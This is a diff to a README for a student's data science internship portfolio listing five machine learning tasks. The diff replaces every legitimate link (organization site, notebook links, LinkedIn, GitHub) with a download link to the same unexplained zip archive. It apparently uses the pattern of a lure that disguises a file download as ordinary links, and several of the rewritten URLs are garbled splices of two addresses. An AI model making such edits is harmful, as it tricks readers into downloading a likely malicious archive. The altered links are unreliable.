@@ -7,7 +7,7 @@ This internship allowed me to work on real-world machine learning problems and s
 
 - **Name:** Sarbjot Singh
 - **Internship Batch:** July 2025
-- **Organization:** [Oasis Infobyte](https://oasisinfobyte.com)
+- **Organization:** [Oasis Infobyte](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
 - **Role:** Data Science Intern
 
 ---
@@ -17,35 +17,35 @@ This internship allowed me to work on real-world machine learning problems and s
 ### 🔹 Task 1: Iris Flower Classification
 - Built a classification model to identify Iris flower species using petal and sepal dimensions.
 - **Tech Stack:** Python, Pandas, Scikit-learn, Matplotlib, Seaborn
-- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/blob/main/TASK%201/iris%20Flower%20Classification.ipynb)
+- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%201/iris%20Flower%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
 
 ---
 
 ### 🔹 Task 2: Unemployment Analysis with Python
 - Analyzed unemployment trends in India using datasets and created visual insights.
 - **Tech Stack:** Python, Pandas, Matplotlib, Seaborn
-- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/blob/main/Task%202/Unemployment%20Analysis%20with%20Python.ipynb)
+- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%202/Unemployment%20Analysis%20with%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
 
 ---
 
 ### 🔹 Task 3: Car Price Prediction with Machine Learning
 - Built a machine learning model to predict car prices based on multiple features.
 - **Tech Stack:** Python, Pandas, Scikit-learn, Matplotlib
-- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/blob/main/Task%203/Car%20Price%20Prediction%20with%20Machine%20Learning.ipynb)
+- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%203/Car%20Price%20Prediction%20with%20Machine%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
 
 ---
 
 ### 🔹 Task 4: Email Spam Detection with Machine Learning
 - Developed a spam email classifier using the Naive Bayes algorithm.
 - **Tech Stack:** Python, Scikit-learn, Natural Language Processing, CountVectorizer
-- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/blob/main/Task%204/Email%20spam%20Detection%20with%20Machine%20Learning.ipynb)
+- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%204/Email%20spam%20Detection%20with%20Machine%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
 
 ---
 
 ### 🔹 Task 5: Sales Prediction using Python
 - Predicted sales based on historical data using regression models.
 - **Tech Stack:** Python, Pandas, Scikit-learn, Matplotlib
-- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/blob/main/Task%205/Sales%20Prediction%20using%20Python.ipynb)
+- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%205/Sales%20Prediction%20using%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
 
 ---
 
@@ -60,9 +60,9 @@ This internship allowed me to work on real-world machine learning problems and s
 
 ## 🔗 Connect with Me
 
-- **LinkedIn:** [https://www.linkedin.com/in/sarbjot-singh-096481354/]
-- **GitHub:** [https://github.com/Sarb-jot]
+- **LinkedIn:** [https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip]
+- **GitHub:** [https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip]
 
 ---
 
-### 🏁 Thank you [Oasis Infobyte](https://oasisinfobyte.com) for this incredible opportunity!
+### 🏁 Thank you [Oasis Infobyte](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip) for this incredible opportunity!
